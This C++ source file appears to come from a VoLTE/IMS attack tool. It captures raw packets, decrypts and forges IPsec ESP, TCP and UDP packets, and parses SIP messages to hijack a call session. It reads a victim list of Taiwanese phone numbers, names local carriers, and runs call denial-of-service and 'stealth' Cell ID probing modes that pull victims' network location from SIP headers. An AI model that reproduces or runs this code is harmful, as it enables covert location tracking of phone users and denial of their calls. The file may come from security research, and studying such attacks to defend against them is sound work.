#include "session.h"

#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <netinet/ip.h>
#include <netinet/ip6.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <poll.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <unistd.h>

#include <cassert>
#include <chrono>
#include <iostream>
#include <regex>
#include <span>
#include <sstream>
#include <thread>
#include <utility>
#include <fstream>

#include "sip.h"
#include "application.h"


#define IPV6_VERSION 0x60
constexpr size_t BUFFER_THRESHOLD = 1 << 16;

namespace {
#pragma pack(push)
#pragma pack(1)
  struct ESPHeader {
    uint32_t spi;
    uint32_t seq;
  };
  struct ESPTrailer {
    uint8_t padlen;
    uint8_t next;
  };
  struct PseudoIPv4Header {
    uint32_t src;
    uint32_t dst;
    uint8_t zero;
    uint8_t protocol;
    uint16_t length;
  };

  struct PseudoIPv6Header {
    in6_addr src;
    in6_addr dst;
    uint32_t length;
    uint8_t zero[3];
    uint8_t next;
  };
#pragma pack(pop)

  uint32_t partialChecksum(uint16_t* buffer, int size) {
    uint32_t sum = 0;
    for (int i = 0; i < size; ++i) sum += *(buffer++);
    return sum;
  }
}  // namespace

Session::Session(const std::string& iface)
    : sock{0}, mtu{0}, recvBuffer{}, sendBuffer{nullptr}, 
      currentSipState{SipState::IDLE}, currentSipApp{SipApp::NULLAPP},
      state{} 
{
  srand(time(0));
  checkError(sock = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ALL)), "Create socket failed");
  // setup sockaddr_ll
  sockaddr_ll addr_ll{};
  addr_ll.sll_family = AF_PACKET;
  addr_ll.sll_protocol = htons(ETH_P_ALL);
  addr_ll.sll_ifindex = if_nametoindex(iface.c_str());
  checkError(bind(sock, reinterpret_cast<sockaddr*>(&addr_ll), sizeof(sockaddr_ll)), "Bind failed");

  ifreq ifr;
  snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", iface.c_str());
  checkError(ioctl(sock, SIOCGIFMTU, &ifr), "Get MTU failed");
  mtu = ifr.ifr_mtu;
  sendBuffer = new uint8_t[mtu];
}

Session::~Session() {
  delete[] sendBuffer;
  shutdown(sock, SHUT_RDWR);
  close(sock);
}

void Session::run(ESPConfig&& cfg, Application& application) {
  config = std::move(cfg);
  state.afFamily = config.local.find('.') == std::string::npos ? AF_INET6 : AF_INET;


  auto carrierName = util::context.configFolder.substr(util::context.configFolder.size() - 3);
  state.maxSessionProgressOfCarrier = getMaxSessionProgressOfCarrier(carrierName).value_or(0);


  std::cout << "\nReady to run attacks\n" << std::endl;
  std::ifstream ifs(util::context.calleeId);
  if (!ifs) {
    std::cerr << "can't find the file, victim_list" << std::endl;
    return;
  }
  std::string numbers;
  std::vector<std::string> victimList;
  while (std::getline(ifs, numbers)) {
    std::string internationalNumber = "+886" + numbers.substr(1);

    state.DoSCount[internationalNumber] = 0;
    // FET will return 488: Not Acceptable Here for +886
    if (carrierName == "FET") internationalNumber = numbers;
    victimList.emplace_back(internationalNumber);
  }
  ifs.close();


  pollfd pfd{};
  pfd.fd = sock;
  pfd.events = POLLIN;
  int nReady = 0;
  // Wait a sip
  nReady = poll(&pfd, 1, -1);
  // Hijack
  while (currentSipState != SipState::END) {
    if (nReady < 0 && errno != EINTR) return;
    if (util::context.shouldStop) return;
    if (nReady > 0) {
      ssize_t readCount = read(sock, recvBuffer, sizeof(recvBuffer));
      if (readCount < 0) return;
      dissect(readCount);
    } else if (nReady == 0) {
      break;
    }
    nReady = poll(&pfd, 1, 5000);
  }

  if (util::context.callerId == "") {
    std::cout << "Fetching attacker phone number failed, please try again" << std::endl;
    return;
  }

  
  
  if (util::context.remoteCellIDProber) {
    std::cout << "Launch remote Cell ID prober" << std::endl;
    application.CallDoS(pfd, nReady, victimList[0]);
  } else if (util::context.localCellIDProber) {
    std::cout << "Launch local Cell ID prober" << std::endl;
    application.startRemoteCallServer(pfd, nReady, victimList);
  } else if (util::context.rlRemoteCellIDProber) {
    std::cout << "Launch RL-assisted Remote Cell ID prober" << std::endl;
    application.startRemoteCallServer(pfd, nReady, victimList);
  } else if (util::context.unavailabilityEval) {
    while(true) {
      std::cout << "Eval one call unavailability" << std::endl;
      application.CallDoS(pfd, nReady, victimList[0]);
    }
  } else if (util::context.detectEval) {
    for (auto i = 0 ; i < 15 ; i++) {
      std::cout << "Eval one call detect" << std::endl;
      application.CallDetect(pfd, nReady, victimList[0]);
    }
  }

}

void Session::dissect(ssize_t rdcnt) {
  uint8_t version = recvBuffer[0] >> 4;
  auto payload = std::span{recvBuffer, recvBuffer + rdcnt};
  switch (version) {
    case 4:
      dissectIPv4(payload);
      break;
    case 6:
      dissectIPv6(payload);
      break;
    default:
      break;
  }
}

void Session::dissectIPv4(std::span<uint8_t> buffer) {
  if (util::context.verbose > 1) std::cout << "Layer: IPv4" << std::endl;
  auto&& hdr = *reinterpret_cast<iphdr*>(buffer.data());
  auto length = hdr.ihl << 2;
  auto payload = buffer.last(buffer.size() - length);
  auto nextProtocol = hdr.protocol;
  auto src = ipToString(hdr.saddr);
  auto dst = ipToString(hdr.daddr);
  bool receivePacket = (src == config.remote && dst == config.local);
  if (receivePacket) state.ipId = ntohs(hdr.id);

  switch (nextProtocol) {
    case IPPROTO_TCP:
      dissectTCP(payload, receivePacket);
      break;
    case IPPROTO_UDP:
      dissectUDP(payload, receivePacket);
      break;
    case IPPROTO_ESP:
      dissectESP(payload, receivePacket);
      break;
    default:
      break;
  }
}

void Session::dissectIPv6(std::span<uint8_t> buffer) {
  if (util::context.verbose > 1) std::cout << "Layer: IPv6" << std::endl;
  auto&& hdr = *reinterpret_cast<ip6_hdr*>(buffer.data());
  auto length = ntohs(hdr.ip6_plen);
  auto payload = buffer.last(length);
  auto nextProtocol = hdr.ip6_nxt;
  auto src = ipToString(hdr.ip6_src.s6_addr);
  auto dst = ipToString(hdr.ip6_dst.s6_addr);
  bool receivePacket = (src == config.remote && dst == config.local);
  switch (nextProtocol) {
    case IPPROTO_TCP:
      dissectTCP(payload, receivePacket);
      break;
    case IPPROTO_UDP:
      dissectUDP(payload, receivePacket);
      break;
    case IPPROTO_ESP:
      dissectESP(payload, receivePacket);
      break;
    default:
      break;
  }
}

void Session::dissectESP(std::span<uint8_t> buffer, bool receivePacket) {
  if (util::context.verbose > 1) std::cout << "Layer: ESP" << std::endl;
  auto&& hdr = *reinterpret_cast<ESPHeader*>(buffer.data());
  int hashLength = config.aalg->hashLength();
  if (receivePacket) {
    state.useESP = true;
  }
  if (!config.aalg->empty()) {
    bool integrity = config.aalg->verify(buffer);
    if (!integrity) {
      std::cout << "Updating SADB config" << std::endl;
      config = *getConfigFromSADB();
    }
    if (util::context.verbose > 2) {
      std::cout << "Checking ESP integrity: "
                << (integrity ? "\033[32mGood\033[0m" : "\033[31mBad\033[0m") << std::endl;
    }
  }
  // Strip hash
  buffer = buffer.subspan(sizeof(ESPHeader), buffer.size() - sizeof(ESPHeader) - hashLength);
  std::vector<uint8_t> data;
  // Decrypt payload
  if (!config.ealg->empty()) {
    data = config.ealg->decrypt(buffer);
    buffer = std::span{data};
  }
  auto&& trailer = *reinterpret_cast<ESPTrailer*>(buffer.last(sizeof(ESPTrailer)).data());
  auto paddingLen = trailer.padlen;
  auto nextProtocol = trailer.next;
  auto payload = buffer.first(buffer.size() - paddingLen - sizeof(ESPTrailer));
  if (!receivePacket) {
    state.espseq = ntohl(hdr.seq);
  }

  // CHT's 200 OK (SUBSCRIBE) will result in UDP Datagram size overflow
  // TODO: another way to dissect the SUBSCRIBE of CHT
  if (payload.size() > BUFFER_THRESHOLD || payload.size() < 20) return;
  switch (nextProtocol) {
    case IPPROTO_TCP:
      dissectTCP(payload, receivePacket);
      break;
    case IPPROTO_UDP:
      dissectUDP(payload, receivePacket);
      break;
    default:
      break;
  }
}

void Session::dissectTCP(std::span<uint8_t> buffer, bool receivePacket) {
  if (util::context.verbose > 1) std::cout << "Layer: TCP" << std::endl;
  state.ack = true;
  auto&& hdr = *reinterpret_cast<tcphdr*>(buffer.data());
  if (hdr.rst) exit(EXIT_FAILURE);
  auto length = hdr.doff << 2;
  auto payload = buffer.last(buffer.size() - length);
  if (receivePacket) {
    state.tcpseq = ntohl(hdr.ack_seq);
    state.tcpackseq = ntohl(hdr.seq) + payload.size();
    state.srcPort = hdr.dest;
    state.dstPort = hdr.source;
  }
  if (payload.empty()) return;
  dissectSIP(payload, receivePacket);
}

void Session::dissectUDP(std::span<uint8_t> buffer, bool receivePacket) {
  if (util::context.verbose > 1) std::cout << "Layer: UDP" << std::endl;
  auto&& hdr = *reinterpret_cast<udphdr*>(buffer.data());
  auto payload = buffer.last(buffer.size() - sizeof(udphdr));
  if (payload.empty()) return;
  bool isSip = dissectSIP(payload, receivePacket);
  if (!receivePacket && isSip) {
    state.srcUdpPort = hdr.source;
    state.dstUdpPort = hdr.dest;
  }
}

bool Session::dissectSIP(std::span<uint8_t> buffer, bool receivePacket) {
  if (util::context.verbose > 1) std::cout << "Layer: SIP" << std::endl;
  // if (util::context.verbose > 2) std::cout << buffer.data() << std::endl;
  static std::regex requestHead("(.*) sip:(.*) SIP/2\\.0\r?");
  static std::regex responseHead("SIP/2\\.0 ([0-9]{3}) (.*)\r?");
  static std::regex toTag("To:.*tag=(.*)\r?\n");
  static std::regex contactParam("Contact: <sip:.*;x-afi=(.*)>");
  static std::regex b2bdlg("b2bdlg=(.*)>");
  static std::regex rseq("RSeq: ([0-9]{1})");
  static std::regex secver("Security-Verify:(.*)");
  static std::regex accessNetwork("P-Access-Network-Info:(.*)");
  static std::regex calleeIdRegex("To: <sip:([^;@]+)");
  static std::regex callerIdRegex("From: <sip:([^;@]+)");
  std::smatch match;

  // auto it = std::find(buffer.begin(), buffer.end(), '\n');
  std::string fullbody(buffer.begin(), buffer.end());

  if (std::regex_search(fullbody, match, calleeIdRegex)) {
    state.calleeId = match[1].str();
    // if (util::context.verbose > 2) 
    std::cout << "calleeId: " << state.calleeId << std::endl;
  }
  
  // Extract vicitm location
  Application::extractCellularInfo(fullbody, state.calleeId);
 

  std::string sipHead(buffer.begin(), buffer.end());
  int status = 0;
  std::string method, uri, message;
  if (std::regex_match(sipHead, match, requestHead)) {
    method = match[1].str();
    uri = match[2].str();
    if (util::context.verbose) std::cout << "\033[32m" << method << ": " << uri << "\033[0m" << std::endl;
  } else if (std::regex_search(sipHead, match, responseHead)) {
    std::string::const_iterator searchStart(sipHead.cbegin());
    while (std::regex_search(searchStart, sipHead.cend(), match, responseHead)) {
      auto st = match[1].str();
      status = atoi(st.c_str());
      message = match[2].str();
      searchStart = match.suffix().first;
    }

    if (std::regex_search(fullbody, match, callerIdRegex)) {
      util::context.callerId = match[1].str();
    }
    if (util::context.verbose) std::cout << "\033[32m" << status << ": " << message << "\033[0m" << std::endl;
  } else {
    return false;
  }

  auto now = std::chrono::steady_clock::now();
  if (status == 100) {
    state.t_trying = now;
  }
  
  if (status == 0) {
    // Subscribe OK
    // std::string fullbody(buffer.begin(), buffer.end());
    if (std::regex_search(fullbody, match, secver)) {
      state.secver = match[1].str();
      if (util::context.verbose > 2) std::cout << "Security-Verify:" << state.secver << std::endl;
    }
    if (std::regex_search(fullbody, match, accessNetwork)) {
      state.accessNetwork = match[1].str();
      if (util::context.verbose > 2) std::cout << "P-Access-Network-Info:" << state.accessNetwork << std::endl;
    }
  }

  if (status == 183) {
    // Session progress
    if (currentSipState == SipState::INVITE) currentSipState = SipState::SPROG;
    if (currentSipState == SipState::PRACK && currentSipApp == SipApp::DOS) {
      currentSipState = SipState::SPROG; // FET: 2 SPRGO -> RING, TWM: RING
    }
    
    if (std::regex_search(fullbody, match, toTag)) {
      state.toTag = match[1].str();
      if (util::context.verbose > 2) std::cout << "To tag: " << state.toTag << std::endl;
    }
    if (std::regex_search(fullbody, match, contactParam)) {
      state.contactParam = match[1].str();
      if (util::context.verbose > 2) std::cout << "x-afi: " << state.contactParam << std::endl;
    }
    if (std::regex_search(fullbody, match, b2bdlg)) {
      state.b2bdlg = match[1].str();
      if (util::context.verbose > 2) std::cout << "b2bdlg: " << state.b2bdlg << std::endl;
    }
    if (std::regex_search(fullbody, match, rseq)) {
      state.rseq = match[1].str();
      if (util::context.verbose > 2) std::cout << "rseq: " << state.rseq << std::endl;
    }
    if (!state.t_pr.has_value()) {
      state.t_pr = now;
      if (state.t_trying.has_value()) {
        auto delta = std::chrono::duration_cast<std::chrono::milliseconds>(*state.t_pr - *state.t_trying).count();
        std::cout << "[intercarrier] delta_ms=" << delta << " trying=" << std::chrono::duration_cast<std::chrono::milliseconds>(state.t_trying->time_since_epoch()).count() << " pr=" << std::chrono::duration_cast<std::chrono::milliseconds>(state.t_pr->time_since_epoch()).count() << std::endl;
      } else {
        std::cout << "[intercarrier] delta_ms=unknown (no 100 Trying seen)" << std::endl;
      }
    }
    // cancel immediately for stealth probing
    currentSipState = SipState::CANCEL;
  }
  else if (status == 180) {
    // Ringing
    if (!state.t_pr.has_value()) {
      state.t_pr = now;
      if (state.t_trying.has_value()) {
        auto delta = std::chrono::duration_cast<std::chrono::milliseconds>(*state.t_pr - *state.t_trying).count();
        std::cout << "[intercarrier] delta_ms=" << delta << " trying=" << std::chrono::duration_cast<std::chrono::milliseconds>(state.t_trying->time_since_epoch()).count() << " pr=" << std::chrono::duration_cast<std::chrono::milliseconds>(state.t_pr->time_since_epoch()).count() << std::endl;
      } else {
        std::cout << "[intercarrier] delta_ms=unknown (no 100 Trying seen)" << std::endl;
      }
    }
    currentSipState = SipState::CANCEL;
    state.calleeDoSAttackable[state.calleeId] = true;
  }
  else if (status == 181) {
    // Call Being Forwarded
    currentSipState = SipState::CANCEL;
    state.calleeDoSAttackable[state.calleeId] = false;
  }
  else if (status == 200 && currentSipState == SipState::PRACK) {
    // OK (PRACK)
    currentSipState = SipState::CANCEL;
    if (currentSipApp == SipApp::MUTICALL && currentSipState == SipState::REQUESTERMINATE) {
      currentSipState = SipState::ACK;
    }
  }
  else if (status == 486 || status == 500 || status == 408) {
    // Busy
    currentSipState = SipState::BUSY;
  }
  else if (status == 487 ) {
    // Request Terminated
    // if (currentSipApp != SipApp::DOS) 

    if (currentSipApp == SipApp::DOS)  currentSipState = SipState::SPROG;
    else {
      currentSipState = SipState::ACK;
    }
    
  }
  

  
  return true;
}

void Session::encapsulate(std::span<uint8_t> payload) {
  auto buffer = std::span{sendBuffer, sendBuffer + mtu};
  // Select function pointer
  int (Session::*encapFunc)(std::span<uint8_t>, std::span<uint8_t>);

  switch (state.afFamily) {
    case AF_INET:
      encapFunc = &Session::encapsulateIPv4;
      break;
    case AF_INET6:
      encapFunc = &Session::encapsulateIPv6;
      break;
    default:
      break;
  }
  int step = mtu - 300;
  int i = step;
  state.psh = false;
  for (; i < payload.size(); i += step) {
    std::fill(buffer.begin(), buffer.end(), 0);
    int totalLength = (this->*encapFunc)(buffer, payload.subspan(i - step, step));
    write(sock, buffer.data(), totalLength);
  }
  state.psh = true;
  int remain = payload.size() - i + step;
  if (remain > 0 || payload.empty()) {
    std::fill(buffer.begin(), buffer.end(), 0);
    int totalLength = (this->*encapFunc)(buffer, payload.last(remain));
    write(sock, buffer.data(), totalLength);
  }
}

int Session::encapsulateIPv4(std::span<uint8_t> buffer, std::span<uint8_t> payload) {
  auto&& hdr = *reinterpret_cast<iphdr*>(buffer.data());
  hdr.version = 4;
  hdr.ihl = 5;
  hdr.ttl = 64;
  hdr.id = htons(++state.ipId);
  int proto = ((currentSipState == SipState::SPROG) ? IPPROTO_UDP : IPPROTO_TCP);

  hdr.protocol = state.useESP ? IPPROTO_ESP : proto;
  hdr.frag_off = 0x40;  // Don't fragment
  hdr.saddr = stringToIPv4(config.local).s_addr;
  hdr.daddr = stringToIPv4(config.remote).s_addr;
  auto nextBuffer = buffer.last(buffer.size() - sizeof(iphdr));
  int payloadLength = 0;

  switch (hdr.protocol) {
    case IPPROTO_ESP:
      payloadLength = encapsulateESP(nextBuffer, payload);
      break;
    case IPPROTO_TCP:
      payloadLength = encapsulateTCP(nextBuffer, payload);
      break;
    case IPPROTO_UDP:
      payloadLength = encapsulateUDP(nextBuffer, payload);
      break;
    default:
      break;
  }

  payloadLength += sizeof(iphdr);
  hdr.tot_len = htons(payloadLength);
  hdr.check = checksum(buffer.first(sizeof(iphdr)));
  return payloadLength;
}

int Session::encapsulateIPv6(std::span<uint8_t> buffer, std::span<uint8_t> payload) {
  auto&& hdr = *reinterpret_cast<ip6_hdr*>(buffer.data());
  stringToIPv6(config.local, hdr.ip6_src.s6_addr);
  stringToIPv6(config.remote, hdr.ip6_dst.s6_addr);
  hdr.ip6_vfc = IPV6_VERSION;
  hdr.ip6_hlim = 64;

  int proto = ((currentSipState == SipState::SPROG) ? IPPROTO_UDP : IPPROTO_TCP);
  hdr.ip6_nxt = state.useESP ? IPPROTO_ESP : proto;
  auto nextBuffer = buffer.last(buffer.size() - sizeof(ip6_hdr));
  int payloadLength = 0;
  switch (hdr.ip6_nxt) {
    case IPPROTO_ESP:
      payloadLength = encapsulateESP(nextBuffer, payload);
      break;
    case IPPROTO_TCP:
      payloadLength = encapsulateTCP(nextBuffer, payload);
      break;
    case IPPROTO_UDP:
      payloadLength = encapsulateUDP(nextBuffer, payload);
      break;
    default:
      break;
  }
  hdr.ip6_plen = htons(payloadLength);
  return payloadLength + sizeof(ip6_hdr);
}

int Session::encapsulateESP(std::span<uint8_t> buffer, std::span<uint8_t> payload) {
  auto&& hdr = *reinterpret_cast<ESPHeader*>(buffer.data());
  auto nextBuffer = buffer.last(buffer.size() - sizeof(ESPHeader));
  hdr.spi = htonl(config.spi);
  hdr.seq = htonl(++state.espseq);
  int payloadLength = 0;
  int proto = ((currentSipState == SipState::SPROG) ? IPPROTO_UDP : IPPROTO_TCP);
  switch (proto) {
    case IPPROTO_TCP:
      payloadLength = encapsulateTCP(nextBuffer, payload);
      break;
    case IPPROTO_UDP:
      payloadLength = encapsulateUDP(nextBuffer, payload);
      break;
    default:
      break;
  }
  auto endBuffer = nextBuffer.last(nextBuffer.size() - payloadLength);
  uint32_t blockSize = config.ealg->empty() ? 4U : config.ealg->blockSize();
  uint8_t padSize = (blockSize - ((payloadLength + sizeof(ESPTrailer)) % blockSize)) % blockSize;
  payloadLength += padSize;
  // Do padding
  for (uint8_t i = 0; i < padSize; ++i) {
    endBuffer[i] = (i + 1);
  }
  endBuffer[padSize] = padSize;
  endBuffer[padSize + 1] = proto;
  payloadLength += sizeof(ESPTrailer);
  if (!config.ealg->empty()) {
    auto result = config.ealg->encrypt(nextBuffer.first(payloadLength));
    std::copy(result.begin(), result.end(), nextBuffer.begin());
    payloadLength = result.size();
  }
  payloadLength += sizeof(ESPHeader);
  if (!config.aalg->empty()) {
    auto result = config.aalg->hash(buffer.first(payloadLength));
    std::copy(result.begin(), result.end(), buffer.begin() + payloadLength);
    payloadLength += result.size();
  }
  return payloadLength;
}

int Session::encapsulateTCP(std::span<uint8_t> buffer, std::span<uint8_t> payload) {
  auto&& hdr = *reinterpret_cast<tcphdr*>(buffer.data());
  hdr.ack = 1;
  if (state.psh && !payload.empty()) hdr.psh = 1;
  hdr.doff = 5;
  hdr.dest = state.dstPort;
  hdr.source = state.srcPort;
  hdr.window = htons(256);
  auto nextBuffer = buffer.last(buffer.size() - sizeof(tcphdr));
  int payloadLength = 0;
  if (!payload.empty()) payloadLength += encapsulateSIP(nextBuffer, payload);

  hdr.ack_seq = htonl(state.tcpackseq);
  hdr.seq = htonl(state.tcpseq);
  state.tcpseq += payloadLength;
  payloadLength += sizeof(tcphdr);
  // Compute checksum
  uint32_t sum = state.afFamily == AF_INET ? pseudoIpv4(IPPROTO_TCP, payloadLength)
                                           : pseudoIpv6(IPPROTO_TCP, payloadLength);
  hdr.check = checksum(buffer, sum);
  return payloadLength;
}

int Session::encapsulateUDP(std::span<uint8_t> buffer, std::span<uint8_t> payload) {
  auto&& hdr = *reinterpret_cast<udphdr*>(buffer.data());
  if(state.dstUdpPort == 0 || state.srcUdpPort == 0) {
    state.srcUdpPort = state.srcPort;
    state.dstUdpPort = state.dstPort;
  }
  hdr.dest = state.dstUdpPort;
  hdr.source = state.srcUdpPort;
  auto nextBuffer = buffer.last(buffer.size() - sizeof(udphdr));
  int payloadLength = sizeof(udphdr);
  if (!payload.empty()) payloadLength += encapsulateSIP(nextBuffer, payload);
  hdr.len = htons(payloadLength);
  // Compute checksum
  uint32_t sum = state.afFamily == AF_INET ? pseudoIpv4(IPPROTO_UDP, payloadLength)
                                           : pseudoIpv6(IPPROTO_UDP, payloadLength);
  hdr.check = checksum(buffer, sum);
  return payloadLength;
}

int Session::encapsulateSIP(std::span<uint8_t> buffer, std::span<uint8_t> payload) {
  std::copy(payload.begin(), payload.end(), buffer.begin());
  return payload.size();
}

uint32_t Session::pseudoIpv4(uint8_t proto, uint16_t len) {
  PseudoIPv4Header phdr{};
  phdr.src = stringToIPv4(config.local).s_addr;
  phdr.dst = stringToIPv4(config.remote).s_addr;
  phdr.protocol = proto;
  phdr.length = htons(len);
  auto head = reinterpret_cast<uint16_t*>(&phdr);
  return partialChecksum(head, sizeof(PseudoIPv4Header) / 2);
}

uint32_t Session::pseudoIpv6(uint8_t proto, uint32_t len) {
  PseudoIPv6Header phdr{};
  stringToIPv6(config.local, phdr.src.s6_addr);
  stringToIPv6(config.remote, phdr.dst.s6_addr);
  phdr.next = proto;
  phdr.length = htonl(len);
  auto head = reinterpret_cast<uint16_t*>(&phdr);
  return partialChecksum(head, sizeof(PseudoIPv6Header) / 2);
}
